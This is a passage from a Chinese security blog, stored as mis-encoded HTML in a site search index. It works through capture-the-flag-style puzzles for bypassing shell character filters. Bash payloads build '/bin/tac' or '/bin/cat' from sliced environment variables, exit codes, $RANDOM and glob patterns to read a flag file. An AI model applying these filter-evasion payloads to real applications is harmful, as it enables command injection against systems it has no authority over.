title="å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ"></a>å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ</h4><p>å¦‚æœæ‰€æœ‰çš„ <code>$(($n))</code> éƒ½ä¸ºæ­£æ•°ï¼Œåˆ™å…¨éƒ¨æ‹¼æ¥åœ¨ä¸€èµ·è¾“å‡ºâ€¦â€¦</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>å‰ä¸ä¹…æƒ³æŠ˜ç£¨ä¸€ä¸‹å¤§ä¸€æ–°ç”Ÿï¼Œç‰¹æ„å»ç ”ç©¶äº†ä¸€ä¸‹</p><p>ç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /flag.txt æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼Œæ€è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; $ ? : ; . &#123; &#125; ~</span><br><span class="line">A D E F H I L M N O P R T S U V</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹ï¼Œæ²¡æœ‰å°å†™å­—æ¯ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤æ˜¯ä¸å¯èƒ½çš„ï¼Œç„¶ååªèƒ½æƒ³åˆ°åˆ©ç”¨ <code>/bin/cat</code> è¿™ä¸€ç±»çš„æ¥å°è¯•ä¸€ä¸‹ï¼Œä½†æ˜¯ / ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦æ€è€ƒä¸€ä¸‹ / ä»å“ªé‡Œæ¥äº†</p><p>ç»™äº†å¤§å†™å­—æ¯å’Œ $ { } å¯ä»¥å°è¯•ä¸€ä¸‹åˆ©ç”¨ç¯å¢ƒå˜é‡ï¼Œenv è¿™ä¸ªæŒ‡ä»¤å¯ä»¥è·å–ç¯å¢ƒå˜é‡ï¼Œä¸åŒäººçš„æœºå­ä¸ä¸€æ ·ï¼Œç¯å¢ƒå˜é‡ä¹Ÿä¸ä¸€æ ·ï¼Œå¯èƒ½ä¼šæœ‰æ‰€å‡ºå…¥ï¼Œä½†æ˜¯æˆ‘çš„æ˜¯ ok çš„ï¼Œæ‰€ä»¥ç›¸ä¿¡å¤§å®¶çš„éƒ½ ok</p><p>å› ä¸º <code>PATH</code> æ˜¯ <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å–å®ƒçš„ç¬¬ä¸€ä½ï¼Œå°±å¯ä»¥è·å¾— / äº†ï¼Œç„¶ååˆæœ‰ <code>SHELL</code> ä¸º <code>/bin/bash</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•å–å®ƒçš„å‰äº”ä½ï¼Œå°±æ˜¯ <code>/bin/</code>ï¼Œç„¶åå°±åªè¦è€ƒè™‘åé¢ç”¨å“ªä¸ªå‘½ä»¤è¯»å–äº†ï¼Œä½†æ˜¯é—®é¢˜å°±æ¥äº†ï¼Œé¢˜ç›®å¹¶æ²¡æœ‰ç»™ğŸ‘´æ•°å­—ï¼Œé‚£ğŸ‘´æ€ä¹ˆåŠå‘¢ï¼Œå¾ˆç®€å•</p><hr><p>shell ä¸­è¿è¡Œçš„æ¯ä¸ªå‘½ä»¤éƒ½ä½¿ç”¨é€€å‡ºçŠ¶æ€ç ï¼ˆexit statusï¼‰æ¥å‘Šè¯‰shell å®ƒå®Œæˆäº†å¤„ç†ã€‚é€€å‡ºçŠ¶æ€ç æ˜¯ä¸€ä¸ª 0 ~ 255 ä¹‹é—´çš„æ•´æ•°å€¼ï¼Œåœ¨å‘½ä»¤ç»“æŸè¿è¡Œæ—¶ç”±å‘½ä»¤ä¼ ç»™shell</p><p>Linux ä½¿ç”¨äº† $? è¿™ä¸ªä¸“å±å˜é‡æ¥ä¿å­˜ä¸Šä¸ªæ‰§è¡Œçš„å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç </p><hr><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ $?  æ¥æ¦¨å–ä¸€ä¸ªæ•°å­—ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ¦¨å–åˆ°å“ªä¸ªæ•°å­—å‘¢ï¼Œåˆæ˜¯å¦å¯¹æˆ‘ä»¬çš„æ“ä½œæœ‰å¸®åŠ©å‘¢</p><p>Linux çš„é”™è¯¯çŠ¶æ€é€€å‡ºçŠ¶æ€ç æ²¡æœ‰ä»€ä¹ˆæ ‡å‡†å¯éµå¾ªï¼Œä½†æœ‰ä¸€äº›å‚è€ƒ</p><table><thead><tr><th>çŠ¶æ€ç </th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>å‘½ä»¤æˆåŠŸç»“æŸ</td></tr><tr><td>1</td><td>ä¸€èˆ¬æ€§æœªçŸ¥é”™è¯¯</td></tr><tr><td>2</td><td>ä¸é€‚åˆçš„ shell å‘½ä»¤</td></tr><tr><td>123</td><td>å‘½ä»¤ä¸å¯æ‰§è¡Œ</td></tr><tr><td>127</td><td>æ²¡æ‰¾åˆ°å‘½ä»¤</td></tr><tr><td>128</td><td>æ— æ•ˆé€€å‡ºå‚æ•°</td></tr><tr><td>128+x</td><td>ä¸ Linux ä¿¡å·xç›¸å…³çš„ä¸¥é‡é”™è¯¯</td></tr><tr><td>130</td><td>é€šè¿‡ ctrl+c ç»ˆæ­¢çš„å‘½ä»¤</td></tr><tr><td>255</td><td>æ­£å¸¸èŒƒå›´ä¹‹å†…çš„é€€å‡ºçŠ¶æ€ç </td></tr></tbody></table><p>emmï¼Œâ€ä¸€èˆ¬æ€§æœªçŸ¥é”™è¯¯â€œ</p><p><img src="https://i.loli.net/2021/04/24/DBCWrJxRAa9ctny.png"></p><p>å½³äºï¼Œé‚£æˆ‘ä»¬å°±æœ‰ä¸€ä¸ª 1 äº†ï¼Œä¸è¿‡ 2 å•¥çš„è¿˜æ²¡æ‰¾åˆ°å’‹æï¼Œä¸è¿‡æœ‰ä¸€ä¸ª 1 å°±å¤Ÿäº†ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ª <code>RANDOM</code> ç¯å¢ƒå˜é‡å¯ä»¥åˆ©ç”¨ï¼š<code>&lt;A;echo $&#123;RANDOM:~A:$?&#125;</code>ï¼Œä»‹ä¸ªæ ·å­å°±å¯ä»¥å–åˆ°ä¸€ä½éšæœºæ•°äº†ï¼Œå¾ˆç„å­¦çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯ <code>~A</code> è¿™ä¸ªç©æ„å„¿ä¼¼ä¹åœ¨ <code>$&#123;&#125;</code> å¯ä»¥å–åˆ°ç¯å¢ƒå˜é‡çš„æœ€åä¸€ä½çš„ä½ç½®ï¼Œåˆ©ç”¨è¿™ä¸ªç‚¹å¯ä»¥ç©å¾ˆå¤šéªšçš„</p><p><img src="https://i.loli.net/2021/04/24/xoP3ThNclKmziE2.png"></p><p>å¥½äº†ï¼Œéšæœºä¸ªä½æ•°å­—ä¹Ÿæ¥äº†ï¼Œæˆ‘ä»¬åªéœ€è¦è¿™æ ·ï¼š<code>&lt;A;echo $&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;</code>ï¼Œéšæœºåˆ°ä¸€ä¸ª 5 å°±å¯ä»¥è·å¾— <code>/bin/</code> è¾£ï¼Œé‚£ä¹ˆæ€ä¹ˆè¯»æ–‡ä»¶å‘¢ï¼Œçœ‹äº†è›®ä¹…çš„ env åå‘ç°ï¼Œä¼¼ä¹ç”¨ tac æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œå› ä¸ºæœ€åä¸€ä½çš„ t è›®å¤šçš„ï¼Œæ¯”å¦‚ HOMEï¼ŒUSERï¼ŒMAILï¼ˆæˆ‘çš„åæ­£æ˜¯ï¼‰</p><p><img src="https://i.loli.net/2021/04/24/5SOdXyIuqklrJTm.png"></p><p>ç„¶åç©ºæ ¼ç”¨ $IFS éšä¾¿è¿‡äº†ï¼Œæœ€åæ–‡ä»¶é©¬é©¬è™è™ä¸€ä¸ª <code>$&#123;PATH::$?&#125;????.???</code> ä»£æ›¿äº† /flag.txtï¼Œæœ€ç»ˆ payloadï¼š<code>&lt;A;$&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;$&#123;USER:~A:$?&#125;??$IFS$&#123;PATH::$?&#125;????.???</code></p><p>ä½ åˆ«è¯´ï¼Œæˆ‘è¿˜çœŸè¯»å‡ºæ¥äº†å¥¥</p><p><img src="https://i.loli.net/2021/04/24/PZC6YcRTd2xHIJu.jpg"></p><p>ä½†æ˜¯å¾ˆå¥‡æ€ªçš„ä¸€ç‚¹ï¼Œå°±æ˜¯ <code>/bin/t?? flag.txt</code> çš„æ—¶å€™ä¼šå‡ºç°å‰ä¸Šå›¾ä¸€å¤§ä¸²å¥‡æ€ªçš„ä¹±ç ï¼Œä½†æ˜¯ç›´æ¥ <code>/bin/tac flag.txt</code> ä¸ä¼š</p><p><img src="https://i.loli.net/2021/04/24/JPpEVxyIgN9vFsR.png"></p><p>è¿™ä¸€ç‚¹ä¸å’‹ç†è§£ï¼Œä½†æ˜¯æ— ä¼¤å¤§é›…</p><p>æœ€åå†æ¥ä¸€ä¸ªï¼Œæˆ‘æŠŠ &lt; æˆ–è€… $? è¿‡æ»¤ï¼ˆå°±æ˜¯è¿™ä¿©è´§è¿åœ¨ä¸€èµ·å°±è¿‡æ»¤ï¼‰çš„è¯åº”è¯¥æ€ä¹ˆåŠï¼Ÿ</p><p>å¾ˆç®€å•ï¼Œç”¨ <code>SHIVL</code> å°± ok äº†ï¼ŒSHIVL=1</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>è¿™ä¼šæƒ³ç»§ç»­æŠ˜ç£¨ä¸€ä¸‹å¤§ä¸€æ–°ç”Ÿï¼Œç»“åˆäº†ä¸€ä¸‹å‰é¢çš„æ„é€ æ•°å­—ï¼Œåº”è¯¥æŒºç®€å•çš„ï¼Œä¸ç§’æ‰çš„è¯å°±è¦æ‰“PP</p><p>okï¼Œç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /FLAG.TXT æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼ŒåŒæ—¶ç¦æ­¢å‡ºç°å½¢å¦‚ <code>~A</code> çš„å­—ç¬¦ä¸²ï¼Œæ€è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ : &#123; &#125; ( ) ~</span><br><span class="line">A D E F G H I L M N O P R T S U X</span><br></pre></td></tr></table></figure><p><del>å…ˆä¸å†™äº†ï¼ŒğŸ‘´ä¹Ÿè¿˜æ²¡ä»”ç»†æƒ³ï¼Œåªæ˜¯è§‰å¾—è¿™æ ·å¯ä»¥å‡ºï¼Œè¿™å‘¨æœ«è¯¾è®¾ï¼Œå¤ªçƒ¦äº†ï¼Œç¡äº†</del></p><p>å¾ˆç®€å•ï¼šåˆ©ç”¨ğŸ‘´å‰é¢åˆ—å‡ºæ¥çš„è¡¨æ ¼å°± ok äº†ï¼Œæ­¤å¤„ä¾¿ä¸åšè¯¦è§£ï¼Œç›´æ¥ç»™å‡º payloadï¼šï¼ˆ/bin/cat FLAG.TXTï¼‰<code>$&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;HOME:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))&#125;$IFS$9FLAG$&#123;LANG:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))))))&#125;TXT</code></p><p><img src="https://i.loli.net/2021/05/03/TIgDzNHnW5V9QBm.png"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>è¶ŠææŠ˜ç£¨ğŸ‘´è¶Šå…´å¥‹ï¼Œæ¥ä¸€æ³¢æ–°çš„ç®€å•æ€è·¯</p><p>ç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /flag.txt æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼Œæ€è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#123; &#125; : 0-9 ? &#x2F; .</span><br></pre></td></tr></table></figure><p>å¤ªç®€å•äº†å¤ªç®€å•äº†ï¼Œç›´æ¥ç»™å‡º payload å§ï¼Œéƒ½ä¸éœ€è¦åˆ†æçš„ï¼šï¼ˆ/bin/less flag.txtï¼‰</p><p><code>/$&#123;0:1:1&#125;??/??$&#123;0:3:1&#125;$&#123;0:3:1&#125; ????.???</code></p><p><img src="https://i.loli.net/2021/05/03/pJRLBk1ijWTIb9u.png"></p><p><img src="https://i.loli.net/2021/05/03/WSBwGPX7LVpeORH.png"></p><p>because $0 è¿”å› <code>-bash</code>ï¼ˆè¿™ä¸ªå¥½åƒç¡®å®æœ‰ä¸åŒï¼Œ@LemonPrefect å¸ˆå‚…çš„å’Œæˆ‘çš„å°±æœ‰åŒºåˆ«ï¼Œä»–çš„ $0 æ˜¯è¿”å› bashï¼Œå¯èƒ½æ˜¯å› ä¸ºğŸ‘´çš„bashç‰ˆæœ¬å¤ªæ—§äº†ï¼Œå½“ç„¶ï¼Œåªæ˜¯ä¸€ä¸ª - çš„åŒºåˆ«ï¼Œæœ¬è´¨è¿˜æ˜¯æ²¡æœ‰å½±å“çš„</p><hr><p><img src="https://i.loli.net/2021/05/03/K9Nk4YmxFnvGLlI.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘çš„ bash ç‰ˆæœ¬æ˜¯ 4.26.46(1)ï¼Œ@LemonPrefect å¸ˆå‚…ç”¨çš„æœ€è€çš„ 4.26.46(2) æµ‹è¯•ä¹Ÿæ˜¯è¿”å› <code>bash</code>ï¼Œè€Œé <code>-bash</code>ï¼Œæ­¤å¤„æ„Ÿè°¢ @LemonPrefect å¸ˆå‚…å¸®å¿™æµ‹è¯•</p><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p>å…³äºå‰é¢è¿™ä¹ˆå¤šéªšä¸œè¥¿ï¼Œè¡¥å……ä¸€äº›åŸºæœ¬åŸç†å’Œæ³¨æ„äº‹é¡¹å§ã€‚</p><p>é¦–å…ˆè¯´è¯´ä¸ºä»€ä¹ˆ $# ä¼šè¿”å› 0 å§ï¼Œæˆ‘ä¸çŸ¥é“</p><p>ç®—äº†ï¼Œæ‡’èµ·æ¥äº†ï¼Œå…ˆä¸æäº†ï¼Œè¿‡æ®µæ—¶é—´å†æ•´ç†å§ã€‚ï¼ˆåˆ«æ‰“ğŸ‘´</p><p>å¯¹äº†ï¼Œè´´ä¸ª bash å¯¹äº <code>$&#123;&#125;</code> å®šä¹‰çš„ç”¨æ³•å§ï¼Œä¹‹åä¼šè¯¦ç»†è¯´æ˜ä¸€æ³¢</p><p><img src="https://i.loli.net/2021/05/03/v7I9upJgMcy6Kdl.png"></p><hr><p>åœ¨ @Guoke é‚£é‡Œçœ‹åˆ°äº†ä»–æ€»ç»“çš„ä¸€äº›ï¼Œå…ˆå·è¿‡æ¥ï¼Œæ”¹å¤©æ•´ç†ä¸€ä¸‹ï¼Œæœ‰å¾ˆå¤šæ–°å§¿åŠ¿ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;PWD:0:1&#125;</span><br><span class="line">è·å–å˜é‡PWDçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">echo $&#123;PWD::1&#125;</span><br><span class="line">å¯ä»¥ä¸ºç©ºã€‚ä¸ºç©ºçš„éƒ¨åˆ†å°±å½“ä½œ0äº†</span><br><span class="line">echo $&#123;PWD#??????&#125;</span><br><span class="line">$&#123;å˜é‡#å­—ç¬¦ä¸²&#125;è¡¨ç¤ºåœ¨å˜é‡ä¸­ã€‚æˆªå–å­—ç¬¦ä¸²å³è¾¹çš„å€¼ã€‚å¯ä»¥ç”¨æ¨¡ç³ŠåŒ¹é…ã€‚æˆªå–PWDçš„æœ€åä¸€ä½</span><br><span class="line">echo $&#123;PWD%??????&#125;</span><br><span class="line">$&#123;å˜é‡%å­—ç¬¦ä¸²&#125;è¡¨ç¤ºåœ¨å˜é‡ä¸­ã€‚æˆªå–å­—ç¬¦ä¸²å·¦è¾¹çš„å€¼ã€‚å¯ä»¥ç”¨æ¨¡ç³ŠåŒ¹é…ã€‚æˆªå–PWDçš„ç¬¬ä¸€ä½</span><br><span class="line">echo $&#123;#PWD&#125;</span><br><span class="line">è·å–å˜é‡PWDçš„é•¿åº¦</span><br><span class="line">AASAA;echo $&#123;#_&#125;</span><br><span class="line">$_ã€‚è¡¨ç¤ºä¸Šä¸€ä¸ªå‘½ä»¤çš„è¿”å›ç»“æœã€‚è¿™æ ·å°±å¯ä»¥æ„é€ ä»»æ„æ•°å­—</span><br><span class="line">echo $&#123;#A&#125;</span><br><span class="line">ç”±äºå˜é‡Aæ²¡å®šä¹‰ã€‚æ‰€ä»¥ä»–çš„é•¿åº¦ä¸º0.</span><br><span class="line">echo $OPTIND</span><br><span class="line">è¿™ä¸ªä¹Ÿå¯ä»¥è·å–æ•°å­—1</span><br><span class="line">&gt;B;echo $?</span><br><span class="line">æœ€åè¿è¡Œçš„å‘½ä»¤çš„ç»“æŸä»£ç ,å¯ä»¥è·å¾—æ•°å­—0</span><br><span class="line">&lt;B;echo $?</span><br><span class="line">æœ€åè¿è¡Œçš„å‘½ä»¤çš„ç»“æŸä»£ç ,å¯ä»¥è·å¾—æ•°å­—1</span><br><span class="line">echo $RANDOM</span><br><span class="line">å¯ä»¥ç”Ÿæˆéšæœºæ•°ã€‚å¯ä»¥é…åˆ#æ„é€ 6543è¿™å‡ ç§æ•°å­—ã€‚æ¦‚ç‡æ¯”è¾ƒå¤§ã€‚è¿˜å¯ä»¥é…åˆæˆªå–ã€‚è·å¾—æ•°å­—</span><br><span class="line">echo $&#123;#$&#125;</span><br><span class="line">$$æ˜¯ç¨‹åºPIDã€‚#è·å–é•¿åº¦ã€‚çœ‹è¿æ°”å’¯</span><br><span class="line">echo $&#123;#SHLVL&#125;</span><br><span class="line">SHLVLè²Œä¼¼æ˜¯ä¸€ä¸ªshellç»ˆç«¯æ·±åº¦ã€‚ã€‚ç„¶å#å¯ä»¥è·å–æ•°å­—1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
